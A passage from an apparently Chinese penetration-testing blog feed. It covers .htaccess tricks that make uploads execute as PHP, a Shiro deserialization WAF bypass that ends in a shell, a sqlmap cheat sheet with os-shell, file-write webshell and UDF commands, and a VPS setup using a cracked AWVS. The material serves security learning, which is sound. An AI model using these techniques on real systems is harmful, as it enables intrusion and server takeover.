<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p>这个时候访问hacker.html就能执行php命令。这种情况一般出现在能够上传.htaccess文件的情况下</p>
<h3 id="解析图片码"><a href="#解析图片码" class="headerlink" title="解析图片码"></a>解析图片码</h3><p>通过.htaccess文件添加文件类型映射关系，从而将图片解析为php文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>

<p>上传成功后再上传图片码即可。</p>
<h3 id="绕过apache的禁止解析"><a href="#绕过apache的禁止解析" class="headerlink" title="绕过apache的禁止解析"></a>绕过apache的禁止解析</h3><p>有时候会碰到题目给出了apache配置文件，在这当中会配置关闭和子目录中的php解析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Directory ~ &quot;/var/www/html/upload/[a-f0-9]&#123;32&#125;/&quot;&gt;</span><br><span class="line">        php_flag engine off</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure>

<p>php_flag engine 设置为0，会关闭该目录和子目录的php解析</p>
<p>我们可以通过上传.htacess文件来开启php解析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Files &quot;*.gif&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">php_flag engine on</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure>

<p>之后随意上传一个文件后缀名为.gif的文件，就可以让当前目录及其子目录下所有文件都被当做 php 解析</p>
]]></content>
      <categories>
        <category>漏洞总结</category>
      </categories>
      <tags>
        <tag>WebShell</tag>
      </tags>
  </entry>
  <entry>
    <title>shiro 实战，绕过 waf</title>
    <url>/posts/4d009b25.html</url>
    <content><![CDATA[<blockquote>
<p>转载自：<a href="https://mp.weixin.qq.com/s/GKbE44VclJKj2PZ4Cpr_Sw">https://mp.weixin.qq.com/s/GKbE44VclJKj2PZ4Cpr_Sw</a></p>
<p>本次 shiro 实战有点像是零组安全实验室考核的那道题目，都是默认密钥，但是无法利用，但是考核人跟我说这是 shiro 的洞，最后也是遗憾没能拿下，今天偶遇这篇文章，思路让我豁然开朗。</p>
</blockquote>
<p>打工人在日常挖洞时，收到了朋友给的一个shiro反序列化洞，而且默认密钥。</p>
<p>抑制住自己激动的心，颤抖的手，赶紧掏出了shiro反序列化利用工具。本以为一切将水到渠成，事实证明，反转总是来得措不及防。</p>
<h2 id="1-长度限制"><a href="#1-长度限制" class="headerlink" title="1. 长度限制"></a>1. 长度限制</h2><p>直接使用shiro反序列化综合利用工具对着漏洞就是“一梭子”，结果……问题不大，可能利用链太少，让我们换一个。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/shiro%E5%AE%9E%E6%88%98%EF%BC%8C%E7%BB%95%E8%BF%87waf/640.png" alt="图片"></p>
<p>通常，飞鸿哥的工具总会给我一个惊喜，然而，飞鸿哥都没有帮我拿下它。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/shiro%E5%AE%9E%E6%88%98%EF%BC%8C%E7%BB%95%E8%BF%87waf/640-16509411241581.jpeg" alt="图片"></p>
<p>这么多利用链都没有一个能拿下它，这shiro怕不是有毒，想安安静静当一个脚本小子看来是不行了。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/shiro%E5%AE%9E%E6%88%98%EF%BC%8C%E7%BB%95%E8%BF%87waf/640-16509411241592.png" alt="图片"></p>
<p>手工一下，看来shiro确实有，我们尝试生成一个payload：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/shiro%E5%AE%9E%E6%88%98%EF%BC%8C%E7%BB%95%E8%BF%87waf/640-16509411241593.png" alt="图片"></p>
<p>自己生成了payload，发现发不过去。payload我就不提供了，网上多的是，看各位想怎么用了：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/shiro%E5%AE%9E%E6%88%98%EF%BC%8C%E7%BB%95%E8%BF%87waf/640-16509411241604.png" alt="图片"></p>
<p>由于payload一个能发过去一个发不过去，证明我应该没有被拉黑。在反复尝试中发现，字符串需要达到一个固定数值，多一个都发不过去。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/shiro%E5%AE%9E%E6%88%98%EF%BC%8C%E7%BB%95%E8%BF%87waf/640-16509411241615.png" alt="图片"></p>
<p>对比了一下，发现一共将近5000个字符，第一行总计才2100，差了800多个字符。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/shiro%E5%AE%9E%E6%88%98%EF%BC%8C%E7%BB%95%E8%BF%87waf/640-16509411241616.png" alt="图片"></p>
<h2 id="2-过程"><a href="#2-过程" class="headerlink" title="2. 过程"></a>2. 过程</h2><p>整体看下来，感觉好像是waf。如何能让waf解析不了，而让服务端可以解析，是目前的主要问题。</p>
<p>尝试HOST回车、TAB等一系列操作均未成功：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/shiro%E5%AE%9E%E6%88%98%EF%BC%8C%E7%BB%95%E8%BF%87waf/640-16509411241617.png" alt="图片"></p>
<p>当去掉GET方法后，发现服务器报501，但是发现返回包有rememberMe：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/shiro%E5%AE%9E%E6%88%98%EF%BC%8C%E7%BB%95%E8%BF%87waf/640-16509411241618.png" alt="图片"></p>
<p>尝试取消请求包的rememeberMe，返回包也没有了，说明后台处理了rememberMe。终于上岸了：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/shiro%E5%AE%9E%E6%88%98%EF%BC%8C%E7%BB%95%E8%BF%87waf/640-16509411241629.png" alt="图片"></p>
<p>问题是解决了，但是一个个生成payload似乎太麻烦了，合理运用工具才会更美好，今天偷个懒，就不自己写脚本了，直接用人家的代理吧：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/shiro%E5%AE%9E%E6%88%98%EF%BC%8C%E7%BB%95%E8%BF%87waf/640-165094112416210.png" alt="图片"></p>
<p>爆破利用链，burp抓包修改后放行：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/shiro%E5%AE%9E%E6%88%98%EF%BC%8C%E7%BB%95%E8%BF%87waf/640-165094112416211.png" alt="图片"></p>
<p>于是，你就可以看到胜利的晨光：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/shiro%E5%AE%9E%E6%88%98%EF%BC%8C%E7%BB%95%E8%BF%87waf/640-165094112416212.png" alt="图片"></p>
<p>后面建议用burp对包请求的字符串进行替换，或者写shell，要不然一直抓包改包，比较麻烦：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/shiro%E5%AE%9E%E6%88%98%EF%BC%8C%E7%BB%95%E8%BF%87waf/640-165094112416213.png" alt="图片"></p>
<h2 id="3-分析"><a href="#3-分析" class="headerlink" title="3. 分析"></a>3. 分析</h2><p>由于请求要经过servlet，所以我在HTTPServlet.class的service函数打了个断点：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/shiro%E5%AE%9E%E6%88%98%EF%BC%8C%E7%BB%95%E8%BF%87waf/640-165094112416314.png" alt="图片"></p>
<p>最后进行上一步操作到”rememberSerializedIdenyity“函数：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/shiro%E5%AE%9E%E6%88%98%EF%BC%8C%E7%BB%95%E8%BF%87waf/640-165094112416315.png" alt="图片"></p>
<p>看到了用于处理请求cookie的”getRememberedSerializedIdentity“函数：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/shiro%E5%AE%9E%E6%88%98%EF%BC%8C%E7%BB%95%E8%BF%87waf/640-165094112416316.png" alt="图片"></p>
<p>因此，当未知http请求时，shiro是先处理cookie后到servlet，所以rememberMe值是会处理的。</p>
<h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h2><p>最终也是拿到了shell。这种防御shiro的方法可谓美妙，取了一个长度临界值，既不影响正常使用，还可以防御攻击。</p>
<p>如果这样可以躲避该waf的话，那是不是在某种程度上也可以用来做webshell，效果应该不错。</p>
<p>对于这种waf，建议对未知http方法的包进行丢弃，或者修改shiro的默认密钥，防止攻击者对其进行破坏。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap的基础使用</title>
    <url>/posts/3e5ae1f5.html</url>
    <content><![CDATA[<h1 id="sqlmap简介"><a href="#sqlmap简介" class="headerlink" title="sqlmap简介"></a>sqlmap简介</h1><p><strong>当给sqlmap一个URL，它会干些什么？</strong></p>
<blockquote>
<p>1）判断可注入的参数</p>
<p>2）判断可以用那种SQL注入技术来注入</p>
<p>3）识别出哪种数据库</p>
<p>4）根据用户选择，读取哪些数据</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--purge		<span class="comment">#清除历史缓存</span></span><br></pre></td></tr></table></figure>

<h1 id="选项摘要"><a href="#选项摘要" class="headerlink" title="选项摘要"></a>选项摘要</h1><h4 id="输出信息的详细程度"><a href="#输出信息的详细程度" class="headerlink" title="输出信息的详细程度"></a><strong>输出信息的详细程度</strong></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-v	<span class="comment">#共7个级别(0~6)，默认为1</span></span><br><span class="line"><span class="comment">#可以用 -vv 代替 -v 2，推荐使用这种方法</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>0</strong>：只输出 Python 出错回溯信息，错误和关键信息</li>
<li><strong>1</strong>：增加输出普通信息和警告信息</li>
<li><strong>2</strong>：增加输出调试信息</li>
<li><strong>3</strong>：增加输出已注入的 payloads</li>
<li><strong>4</strong>：增加输出 HTTP 请求</li>
<li><strong>5</strong>：增加输出 HTTP 响应头</li>
<li><strong>6</strong>：增加输出 HTTP 响应内容</li>
</ul>
<h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a><strong>目标</strong></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-d	<span class="comment">#直连数据库，&quot;mysql://root:root@192.168.0.8:3306/testdb&quot;</span></span><br><span class="line">-u URL</span><br><span class="line">-l	<span class="comment">#从Burp代理日志文件中解析目标地址</span></span><br><span class="line">-m	<span class="comment">#从文本文件中批量获取目标</span></span><br><span class="line">-r	<span class="comment">#从文件中读取 HTTP 请求</span></span><br><span class="line"></span><br><span class="line">--purge			<span class="comment">#清除历史缓存</span></span><br><span class="line">--flush-session	<span class="comment">#清除上次扫描的缓存</span></span><br></pre></td></tr></table></figure>

<h4 id="请求"><a href="#请求" class="headerlink" title="请求"></a><strong>请求</strong></h4><p>指定连接目标地址的方式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--method=METHOD		<span class="comment">#强制使用提供的 HTTP 方法（例如：PUT）</span></span><br><span class="line">--data=DATA			<span class="comment">#使用 POST 发送数据串；--data=&quot;id=1&amp;user=admin&quot;</span></span><br><span class="line">--param-del=<span class="string">&quot;;&quot;</span>		<span class="comment">#使用参数分隔符，--data=&quot;id=1;user=admin&quot;</span></span><br><span class="line">--cookie=COOKIE		<span class="comment">#指定 HTTP Cookie ，--cookie &quot;id=11&quot; --level 2</span></span><br><span class="line">--drop-set-cookie	<span class="comment">#忽略 HTTP 响应中的 Set-Cookie 参数</span></span><br><span class="line">--user-agent=AGENT	<span class="comment">#指定 HTTP User-Agent</span></span><br><span class="line">--random-agent		<span class="comment">#使用随机的 HTTP User-Agent，随机从 ./txt/user-agents.txt 选一个，不是每次请求换一个</span></span><br><span class="line">--referer=REFERER	<span class="comment">#指定 HTTP Referer</span></span><br><span class="line">-H HEADER			<span class="comment">#设置额外的 HTTP 头参数（例如：&quot;X-Forwarded-For: 127.0.0.1&quot;）</span></span><br><span class="line">--headers=HEADERS	<span class="comment">#设置额外的 HTTP 头参数,必须以换行符分隔（例如：&quot;Accept-Language: fr\nETag: 123&quot;）</span></span><br><span class="line">--delay=10			<span class="comment">#设置每个 HTTP 请求的延迟秒数</span></span><br><span class="line">--safe-freq=SAFE	<span class="comment">#每访问两次给定的合法 URL 才发送一次测试请求</span></span><br></pre></td></tr></table></figure>

<h4 id="注入"><a href="#注入" class="headerlink" title="注入"></a><strong>注入</strong></h4><p>以下选项用于指定要测试的参数</p>
<p>提供自定义注入 payloads 和篡改参数的脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-p TESTPARAMETER	<span class="comment">#指定需要测试的参数</span></span><br><span class="line">--skip=SKIP			<span class="comment">#指定要跳过的参数</span></span><br><span class="line">--dbms=DBMS			<span class="comment">#指定 DBMS 类型（例如：MySQL）</span></span><br><span class="line">--os=OS				<span class="comment">#指定 DBMS 服务器的操作系统类型</span></span><br><span class="line">--prefix=PREFIX		<span class="comment">#注入 payload 的前缀字符串</span></span><br><span class="line">--suffix=SUFFIX		<span class="comment">#注入 payload 的后缀字符串</span></span><br><span class="line">--tamper=TAMPER		<span class="comment">#用给定脚本修改注入数据</span></span><br></pre></td></tr></table></figure>

<h4 id="检测"><a href="#检测" class="headerlink" title="检测"></a><strong>检测</strong></h4><p>sqlmap 使用的 payloads 直接从文本文件 <code>xml/payloads.xml</code> 中载入。</p>
<p>根据该文件顶部的相关指导说明进行设置，如果 sqlmap 漏过了特定的注入，</p>
<p>你可以选择自己修改指定的 payload 用于检测。</p>
<p><strong>level有5级，越高检测越全，默认为 1</strong></p>
<blockquote>
<p>–level 1 检测Get和Post</p>
<p>–level 2 检测HTTP Cookie</p>
<p>–level 3 检测User-Agent和Referer</p>
<p>–level 4 检测</p>
<p>–level 5 检测 HOST 头</p>
</blockquote>
<p><strong>risk有3级，级别越高风险越大，默认为1</strong></p>
<blockquote>
<p>–risk 2 会在默认的检测上添加大量时间型盲注语句测试</p>
<p>–risk 3 会在原基础上添加<code>OR</code> 类型的布尔型盲注 ，可能会update导致修改数据库</p>
</blockquote>
<h4 id="技术"><a href="#技术" class="headerlink" title="技术"></a><strong>技术</strong></h4><p>以下选项用于调整特定 SQL 注入技术的测试方法</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--technique=TECH	<span class="comment">#使用的 SQL 注入技术（默认为“BEUSTQ”)</span></span><br><span class="line">B: Boolean-based blind SQL injection（布尔型盲注）</span><br><span class="line">E: Error-based SQL injection（报错型注入）</span><br><span class="line">U: UNION query SQL injection（联合查询注入）</span><br><span class="line">S: Stacked queries SQL injection（堆查询注入）</span><br><span class="line">T: Time-based blind SQL injection（时间型盲注）</span><br><span class="line">Q: inline Query injection（内联查询注入）</span><br><span class="line"></span><br><span class="line">--time-sec=TIMESEC  <span class="comment">#设置延时注入的时间（默认为 5）</span></span><br><span class="line">--second-order=S..  <span class="comment">#设置二阶响应的结果显示页面的 URL（该选项用于二阶 SQL 注入）</span></span><br></pre></td></tr></table></figure>

<h4 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a><strong>枚举</strong></h4><p>以下选项用于获取数据库的信息，结构和数据表中的数据。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-a, --all          <span class="comment">#获取所有信息、数据</span></span><br><span class="line">-b, --banner        <span class="comment">#获取 DBMS banner,返回数据库的版本号</span></span><br><span class="line">--current-user			<span class="comment">#获取 DBMS 当前用户</span></span><br><span class="line">--current-db			<span class="comment">#获取 DBMS 当前数据库</span></span><br><span class="line">--hostname				<span class="comment">#获取 DBMS 服务器的主机名</span></span><br><span class="line">--is-dba				<span class="comment">#探测 DBMS 当前用户是否为 DBA（数据库管理员）</span></span><br><span class="line">--<span class="built_in">users</span>					<span class="comment">#枚举出 DBMS 所有用户</span></span><br><span class="line">--passwords				<span class="comment">#枚举出 DBMS 所有用户的密码哈希</span></span><br><span class="line">--privileges			<span class="comment">#枚举出 DBMS 所有用户特权级</span></span><br><span class="line">--roles					<span class="comment">#枚举出 DBMS 所有用户角色</span></span><br><span class="line"></span><br><span class="line">--dbs					<span class="comment">#枚举出 DBMS 所有数据库</span></span><br><span class="line">--tables				<span class="comment">#枚举出 DBMS 数据库中的所有表</span></span><br><span class="line">--columns				<span class="comment">#枚举出 DBMS 表中的所有列</span></span><br><span class="line">--schema				<span class="comment">#枚举出 DBMS 所有模式</span></span><br><span class="line">--count					<span class="comment">#获取数据表数目</span></span><br><span class="line">--dump					<span class="comment">#导出 DBMS 数据库表项</span></span><br><span class="line">--stop 10				<span class="comment">#只取前10行数据</span></span><br><span class="line">    </span><br><span class="line">-D DB					<span class="comment">#指定要枚举的 DBMS 数据库</span></span><br><span class="line">-T TBL					<span class="comment">#指定要枚举的 DBMS 数据表</span></span><br><span class="line">-C COL					<span class="comment">#指定要枚举的 DBMS 数据列</span></span><br><span class="line">    </span><br><span class="line">--sql-query=QUERY		<span class="comment">#指定要执行的 SQL 语句</span></span><br><span class="line">--sql-shell				<span class="comment">#调出交互式 SQL shell</span></span><br></pre></td></tr></table></figure>

<h1 id="用例"><a href="#用例" class="headerlink" title="用例"></a>用例</h1><p><strong>从文件读取HTTP请求，GET和POST都可以</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r <span class="string">&quot;burp.txt&quot;</span> -p <span class="string">&quot;username&quot;</span>	<span class="comment">#-p 指定存在注入的参数</span></span><br></pre></td></tr></table></figure>

<p><strong>Cookie注入</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://www.vuln.com&quot;</span> --cookie <span class="string">&quot;id=11&quot;</span> --level 2</span><br></pre></td></tr></table></figure>

<p><strong>当防火墙，对请求速度做了限制</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://www.vuln.com/post.php?id=1&quot;</span> --delay=10</span><br><span class="line"><span class="comment">#在每个HTTP请求之间的延迟10秒</span></span><br></pre></td></tr></table></figure>

<h2 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqpmap  -u http://victim.com/id/666*.html --dbs  <span class="comment">#在html扩展名前加个&#x27;*&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="访问文件系统"><a href="#访问文件系统" class="headerlink" title="访问文件系统"></a>访问文件系统</h2><p>仅对MySQL、MSSQL、PosgreSQL有效</p>
<p>数据库用户有读写权限，有目录读写文件权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u url --is-dba</span><br><span class="line"><span class="comment">#查看是否dba权限,必须为root权限</span></span><br><span class="line"></span><br><span class="line">sqlmap -u url --file-read <span class="string">&quot;C:/Windows/win.ini&quot;</span>		</span><br><span class="line"><span class="comment">#读取文件</span></span><br><span class="line"></span><br><span class="line">sqlmap -u url --file-write=D:/shell.php --file-dest=C:/www/shell.php</span><br><span class="line"><span class="comment">#上传文件 (本地木马路径:目标网站目录)</span></span><br></pre></td></tr></table></figure>

<h2 id="接管操作系统"><a href="#接管操作系统" class="headerlink" title="接管操作系统"></a>接管操作系统</h2><p>仅对MySQL、MSSQL、PosgreSQL有效</p>
<p>数据库用户有读写权限，有目录读写文件权限</p>
<p>sqlmap 能够在<strong>数据库所在服务器的操作系统上运行任意的命令</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;URL&quot;</span> --os-shell	<span class="comment">#获取系统交互shell或--os-cmd=id执行系统命令</span></span><br></pre></td></tr></table></figure>

<p><a href="https://blog.sari3l.com/posts/8dea0d95/">原理 (opens new window)</a>就是上传一个upload木马后，再上传一个cmd shell；</p>
<p>当 –os-shell 退出后， 会调用后门脚本删除上传文件后，进行自删除。</p>
<blockquote>
<p>在 MySQL 和 PostgreSQL 中，sqlmap 可以上传一个包含两个用户自定义函数</p>
<p>分别为 <code>sys_exec()</code> 和 <code>sys_eval()</code> 的共享库（二进制文件）</p>
<p>然后在数据库中创建出两个对应函数，并调用对应函数执行特定的命令，并允许用户选择是否打印出相关命令执行的结果。</p>
<p>在 Microsoft SQL Server 中，sqlmap 会利用 <code>xp_cmdshell</code> 存储过程：</p>
<p>如果该存储过程被关闭了（Microsoft SQL Server 的 2005 及以上版本默认关闭），sqlmap 则会将其重新打开；</p>
<p>如果该存储过程不存在，sqlmap 则会重新创建它。</p>
<p>当用户请求标准输出，sqlmap 将使用任何可用的 SQL 注入技术（盲注、带内注入、报错型注入）去获取对应结果。</p>
<p>相反，如果无需标准输出对应结果，sqlmap 则会使用堆叠查询注入（Stacked queries）技术执行相关的命令。</p>
<p>如果堆叠查询没有被 Web 应用识别出来，并且 DBMS 为 MySQL，</p>
<p>假如后端 DBMS 和 Web 服务器在同一台服务器上，</p>
<p>则仍可以通过利用 <code>SELECT</code> 语句中的 <code>INTO OUTFILE</code>，在 根目录可写目录中写shell</p>
</blockquote>
<h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><p>使用选项 <code>--udf-inject</code> 并按照说明进行操作即可；</p>
<p>如果需要，也可以使用 <code>--shared-lib</code> 选项通过命令行指定共享库的本地文件系统路径。</p>
<p>否则 sqlmap 会在运行时向你询问路径。</p>
<p>此功能仅对 MySQL 或 PostgreSQL 有用。</p>
<h1 id="tamper脚本"><a href="#tamper脚本" class="headerlink" title="tamper脚本"></a>tamper脚本</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use age：sqlmap.py --tamper=<span class="string">&quot;模块名.py&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apostrophemask			<span class="comment">#将单引号 url 编码</span></span><br><span class="line">apostrophenullencode	<span class="comment">#将单引号替换为宽字节 unicode 字符</span></span><br><span class="line">base64encode			<span class="comment">#base64 编码</span></span><br><span class="line">between			<span class="comment">#将大于符号和等号用 between 语句替换，用于过滤了大于符号和等号的情况</span></span><br><span class="line">bluecoat		<span class="comment">#用随机的空白字符代替空格，并且将等号替换为 like ，用于过滤了空格和等号的情况</span></span><br><span class="line">charencode				<span class="comment">#用 url 编码一次你的 payload</span></span><br><span class="line">charunicodeencode		<span class="comment">#用 unicode 编码 payload ，只编码非编码字符</span></span><br></pre></td></tr></table></figure>

<p><a href="https://wooyun.js.org/drops/SQLMAP%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8.html">自定义tamper</a></p>
]]></content>
      <categories>
        <category>基础教程</category>
      </categories>
      <tags>
        <tag>Sql</tag>
      </tags>
  </entry>
  <entry>
    <title>vps 部署和联动 goby 和 awvs</title>
    <url>/posts/759fd41d.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在 vps 上部署 goby 和 awvs ，两者联动扫描，goby 扫端口，awvs 扫漏洞。</p>
<p>goby: <a href="https://gobies.org/goby-linux-x64-1.9.325.zip">https://gobies.org/goby-linux-x64-1.9.325.zip</a></p>
<p>awvs: 14.7(破解版 ———— 来自公众号雾晓安全)</p>
<p>vps: vultr 洛杉矶机房（比较稳定） Ubuntu 18</p>
<h2 id="安装goby"><a href="#安装goby" class="headerlink" title="安装goby"></a>安装goby</h2><p>（1）下载Goby，解压缩</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -p pentest/goby &amp;&amp; cd pentest/goby</span><br><span class="line">wget https://gobies.org/goby-linux-x64-1.9.325.zip</span><br><span class="line">unzip goby-linux-x64-1.9.325.zip</span><br><span class="line">mv goby-linux-x64-1.9.325.zip goby-linux</span><br></pre></td></tr></table></figure>

<p>（2）后台运行，输出到指定日志文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#创建.sh并写入命令</span><br><span class="line">echo /root/pentest/goby/goby-linux/golib/goby-cmd-linux -apiauth user:pass -mode api -bind 0.0.0.0:8361 &gt; goby.sh</span><br><span class="line"></span><br><span class="line"># 安装防火墙 ufw 和放行端口</span><br><span class="line">apt-get install ufw</span><br><span class="line">ufw allow 8361</span><br><span class="line"></span><br><span class="line">#实现屏幕输出记录到日志文件</span><br><span class="line"> nohup sh goby.sh  &gt; info.log &amp;</span><br></pre></td></tr></table></figure>

<h2 id="安装awvs"><a href="#安装awvs" class="headerlink" title="安装awvs"></a>安装awvs</h2><blockquote>
<p>当然 awvs 也可以使用 docker 安装。</p>
<p>可以参考：</p>
</blockquote>
<p>（1）安装 awvs14.7 所需依赖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install libxdamage1 libgtk-3-0 libasound2 libnss3 libxss1 libx11-xcb-dev libpango-1.0 libxi6 libx11-xcb1 -y</span><br></pre></td></tr></table></figure>

<p>但此时仍旧缺失依赖 libgbm.so.1 ，可能是我的 awvs 是最新版的，而缺失的依赖无法使用 <code>apt-get</code> 安装，这时，我们需要手动安装依赖。</p>
<p>遇到问题并不可怕，我们需要有解决问题的能力，因为问题是永无止境的，可能你按照我的文章安装的时候，出错的地方并不一样。</p>
<p><strong>手动安装依赖</strong></p>
<p>访问：<a href="https://packages.debian.org/">https://packages.debian.org/</a></p>
<p>搜索 libgbm</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/vps部署和联动goby和awvs/image-20220501112505343.png" alt="image-20220501112505343" style="zoom: 33%;" />

<p>有两个结果：</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/vps部署和联动goby和awvs/image-20220501112544787.png" alt="image-20220501112544787" style="zoom:50%;" />

<p>第一次我选择了第一个，没有成功，选择第二个的话可以。</p>
<p>选择 amd64 架构</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/vps部署和联动goby和awvs/image-20220501113047169.png" alt="image-20220501113047169" style="zoom:50%;" />

<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/vps部署和联动goby和awvs/image-20220501113235654.png" alt="image-20220501113235654" style="zoom: 33%;" />

<p>下载链接：<a href="http://ftp.cn.debian.org/debian/pool/main/m/mesa/libgbm1_20.3.5-1_amd64.deb">http://ftp.cn.debian.org/debian/pool/main/m/mesa/libgbm1_20.3.5-1_amd64.deb</a></p>
<p>下载到 vps 之后，安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://ftp.cn.debian.org/debian/pool/main/m/mesa/libgbm1_20.3.5-1_amd64.deb</span><br><span class="line">dpkg -i libgbm1_20.3.5-1_amd64.deb</span><br></pre></td></tr></table></figure>

<p>（2）安装 awvs</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/vps部署和联动goby和awvs/image-20220501113745374.png" alt="image-20220501113745374" style="zoom:50%;" />

<p>下载好 awvs 和破解补丁到 vps 之后，执行命令：</p>
